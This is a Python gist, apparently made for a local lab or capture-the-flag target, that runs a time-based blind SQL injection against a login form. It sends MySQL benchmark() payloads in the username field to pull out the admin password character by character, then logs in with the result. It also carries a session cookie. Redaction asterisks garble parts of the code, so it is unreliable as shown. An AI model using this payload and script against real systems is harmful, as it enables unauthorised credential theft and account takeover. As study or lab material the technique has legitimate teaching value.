#date: 2023-02-27T16:59:24Z
#url: https://api.github.com/gists/07169e40c029e256ff0d9e06c03cf0b2
#owner: https://api.github.com/users/l3moon

import requests 
import time
import string 

chars = [char for char in string.ascii_uppercase + string.ascii_lowercase + string.digits]
cookies = {"session":"eyJpZCI6eyIgYiI6InNPUzk4cTVJUFRpRm9PdHBRSklxS1E9PSJ9LCJ0cmllcyI6MH0.Y_lHKg.Bh-TUBn7W08U3glQE9Zv6HIjfss"} 
url = "http://127.0.0.1:8001/login"

POSITIVE_DELAY = 2
def query(pos, char):
    return f"b' or if (mid(BINARY (select password from users where username = "**********"=BINARY '{char}',benchmark(10000000,md5(1)),'False');-- #"
def timeit(func):
  def wrapper(*args, **kwargs):
    t0 = time.time()
    result = func(*args, **kwargs)
    elapsed = time.time() - t0
    return elapsed, result
  return wrapper

@timeit
def sql_test(pos, char):
  data = {
    'username': query(pos, char),
    'password': "**********"
  }
  try :
    resp = requests.post(url, data=data, cookies=cookies)
    return resp.ok
  except (requests.exceptions.ConnectionError,requests.exceptions.RetryError):
    return False    

 "**********"d "**********"e "**********"f "**********"  "**********"r "**********"e "**********"t "**********"r "**********"i "**********"e "**********"v "**********"e "**********"_ "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"( "**********"l "**********"e "**********"n "**********"g "**********"t "**********"h "**********") "**********": "**********"
  buffer = ""
  for pos in range(1, length + 1):
    found = False
    for char in chars:
      if sql_test(pos, char)[0] > POSITIVE_DELAY:
        print(f"At This Position {pos}: We Got {char}")
        buffer += char
        found = True
        break
    if not found:
      break
  return buffer

 "**********"d "**********"e "**********"f "**********"  "**********"t "**********"e "**********"s "**********"t "**********"_ "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"( "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********") "**********": "**********"
    data = {
        'username': 'admin',
        'password': "**********"
    }
    r = requests.post(url, data=data, cookies=cookies)
    return r.text

password = "**********"
print(f"password: "**********"
#bTNjcGJnOUhGdkVwMTZ4T3QzWXBPUT09
print(test_password(password))